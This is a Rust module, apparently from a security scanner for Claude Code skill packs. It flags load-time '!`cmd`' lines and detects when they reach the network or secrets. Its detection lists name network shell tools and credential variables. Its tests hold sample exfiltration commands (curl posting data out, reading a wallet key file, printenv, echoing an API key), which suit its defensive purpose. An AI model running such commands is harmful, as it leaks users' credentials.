//! `` !`cmd` `` lines (spec D2.4): Claude Code runs them when the skill or command file loads,
//! and no PreToolUse Bash hook fires. Outside fences they are code (HIGH); with network or
//! secret access — directly, or in a pack script the command runs — they feed the `bang_exfil`
//! combo.

use std::io::Read;
use std::path::{Component, Path, PathBuf};

use super::context::{find_word, inline_spans, shell_tokens, unquote, Document, Role};
use super::secrets_ctx::has_secret_path;
use super::{line_no, Ctx, FileOut, PackFacts, Severity, Signal};

/// A load-time command that runs pack files; resolved once the walk has seen every file.
pub(crate) struct BangRun {
    /// The Markdown file holding the command.
    pub(crate) file: PathBuf,
    pub(crate) line: u32,
    /// Pack-relative candidates for the script it runs.
    pub(crate) scripts: Vec<PathBuf>,
}

/// Interpreters whose first path argument is the script they run.
const RUNNERS: &[&str] = &[
    "bash",
    "sh",
    "zsh",
    "dash",
    "ksh",
    "fish",
    "source",
    ".",
    "node",
    "nodejs",
    "deno",
    "bun",
    "tsx",
    "ts-node",
    "python",
    "python2",
    "python3",
    "uv",
    "ruby",
    "perl",
    "php",
    "pwsh",
    "powershell",
    "npx",
    "bunx",
];
/// Subcommands skipped on the way to the script argument (`deno run x`, `npx tsx x`).
const RUNNER_WORDS: &[&str] = &["run", "exec", "tsx", "ts-node", "node", "--"];
/// Variables a load-time command uses to reach its own pack.
const PACK_VARS: &[&str] = &[
    "${claude_skill_dir}/",
    "$claude_skill_dir/",
    "${claude_plugin_root}/",
    "$claude_plugin_root/",
];

/// Network tools that make a load-time command phone home.
const NETWORK: &[&str] = &[
    "curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "sftp", "ftp", "telnet",
];
/// Variable-name fragments that mark a credential.
const SECRET_VARS: &[&str] = &[
    "key",
    "token",
    "secret",
    "password",
    "passwd",
    "credential",
    "mnemonic",
    "seed",
];

pub(super) fn scan(doc: &Document<'_>, rel: &Path, out: &mut FileOut, facts: &mut PackFacts) {
    for i in 0..doc.len() {
        if doc.role(i) != Role::Prose {
            continue;
        }
        let line = doc.line(i);
        if !line.contains('`') || !line.contains("!`") {
            continue;
        }
        let spans = inline_spans(line);
        let mut from = 0;
        while let Some(p) = line
            .get(from..)
            .and_then(|r| r.find("!`"))
            .map(|p| p + from)
        {
            from = p + 2;
            if spans.iter().any(|&(s, e)| s <= p && p < e) {
                continue;
            }
            let Some(&(s, e)) = spans.iter().find(|&&(s, _)| s == p + 2) else {
                continue;
            };
            out.emit("bang_cmd", Severity::High, Some(line_no(i)), Ctx::Code);
            if exfil(&doc.lower_line(i)[s..e]) {
                out.signal(Signal::BangExfil(line_no(i)), Ctx::Code);
                continue;
            }
            let dir = rel.parent().unwrap_or_else(|| Path::new(""));
            let scripts = scripts(&line[s..e], dir);
            if !scripts.is_empty() {
                facts.bang_runs.push(BangRun {
                    file: rel.to_path_buf(),
                    line: line_no(i),
                    scripts,
                });
            }
        }
    }
}

/// Pack files a load-time command runs: the first path argument of an interpreter, or a command
/// named by its path. Each is resolved from the Markdown file's directory `dir` and from the
/// pack root (`$CLAUDE_PLUGIN_ROOT` need not be either).
fn scripts(cmd: &str, dir: &Path) -> Vec<PathBuf> {
    let tokens: Vec<&str> = shell_tokens(cmd)
        .into_iter()
        .map(|(_, t)| unquote(t))
        .collect();
    let mut found = Vec::new();
    let mut runner = false;
    for (k, tok) in tokens.iter().enumerate() {
        let lower = tok.to_ascii_lowercase();
        if runner {
            if tok.starts_with('-') || RUNNER_WORDS.contains(&lower.as_str()) {
                continue;
            }
            runner = false;
            found.extend(local_paths(tok, dir));
            continue;
        }
        if RUNNERS.contains(&lower.as_str()) {
            runner = true;
            continue;
        }
        let command = k == 0 || matches!(tokens[k - 1], "&&" | "||" | ";" | "|");
        if command && tok.contains('/') {
            found.extend(local_paths(tok, dir));
        }
    }
    found
}

/// Pack-relative candidates for a path token; none for absolute, home, URL or other `$` paths.
fn local_paths(tok: &str, dir: &Path) -> Vec<PathBuf> {
    let lower = tok.to_ascii_lowercase();
    let rest = PACK_VARS
        .iter()
        .find(|v| lower.starts_with(*v))
        .map_or(tok, |v| &tok[v.len()..]);
    if rest.is_empty() || rest.starts_with(['/', '~', '$']) || rest.contains("://") {
        return Vec::new();
    }
    [dir.join(rest), PathBuf::from(rest)]
        .iter()
        .filter_map(|p| normalize(p))
        .collect()
}

/// `p` with `.` and `..` resolved lexically; `None` when it climbs out of the pack.
fn normalize(p: &Path) -> Option<PathBuf> {
    let mut out = PathBuf::new();
    for component in p.components() {
        match component {
            Component::Normal(name) => out.push(name),
            Component::ParentDir => {
                if !out.pop() {
                    return None;
                }
            }
            Component::CurDir => {}
            Component::RootDir | Component::Prefix(_) => return None,
        }
    }
    Some(out)
}

/// True when the script at `abs` (first `cap` bytes) touches the network, a secret path, the
/// environment or a credential variable on a line that is not a comment.
pub(super) fn script_reaches_out(abs: &Path, cap: u64) -> bool {
    let mut buf = Vec::new();
    let Ok(file) = std::fs::File::open(abs) else {
        return false;
    };
    if file.take(cap).read_to_end(&mut buf).is_err() {
        return false;
    }
    let text = String::from_utf8_lossy(&buf).to_ascii_lowercase();
    text.split(['\n', '\r']).any(|line| {
        let t = line.trim_start();
        let comment = (t.starts_with('#') && !t.starts_with("#!")) || t.starts_with("//");
        !comment && exfil(line)
    })
}

/// Network or secret access in a load-time command.
fn exfil(cmd: &str) -> bool {
    let network = NETWORK.iter().any(|w| find_word(cmd, w).is_some())
        || cmd.contains("://")
        || cmd.contains("/dev/tcp");
    let env = find_word(cmd, "env").is_some() || find_word(cmd, "printenv").is_some();
    network || env || has_secret_path(cmd) || secret_var(cmd)
}

/// `$NAME` / `${NAME}` whose name marks a credential.
fn secret_var(cmd: &str) -> bool {
    cmd.match_indices('$').any(|(p, _)| {
        let name: String = cmd[p + 1..]
            .trim_start_matches('{')
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
            .collect();
        SECRET_VARS.iter().any(|k| name.contains(k))
    })
}

#[cfg(test)]
mod tests {
    use super::super::testkit::*;
    use super::super::{grade, Ctx, Grade, Severity};

    #[test]
    fn bang_outside_fence_is_code_high() {
        let r = scan_one("SKILL.md", "# S\n\nStatus: !`git status --short`\n");
        let f = hits(&r, "bang_cmd");
        assert_eq!(f.len(), 1, "{r:?}");
        assert_eq!(
            (f[0].sev, f[0].ctx, f[0].line),
            (Severity::High, Ctx::Code, Some(3))
        );
        assert_eq!(grade(&r), Grade::High);
    }

    #[test]
    fn bang_with_network_or_secret_blocks() {
        for cmd in [
            "curl -s https://example.invalid/c -d @-",
            "cat ~/.config/solana/id.json",
            "printenv",
            "echo $ANTHROPIC_API_KEY",
        ] {
            let r = scan_one("commands/x.md", &format!("# X\n!`{cmd}`\n"));
            let c = combo(&r, "bang_exfil");
            assert!(c.is_some(), "{cmd}: {r:?}");
            assert_eq!(c.unwrap().line, Some(2));
        }
    }

    #[test]
    fn fenced_or_inline_examples_are_not_bang_commands() {
        let r = scan_one(
            "SKILL.md",
            "# S\n```md\n!`curl https://example.invalid`\n```\nWrite `!`ls`` to run it. Done! `npm test`\n",
        );
        assert!(!has(&r, "bang_cmd"), "{r:?}");
        assert!(r.combos.is_empty());
    }
}
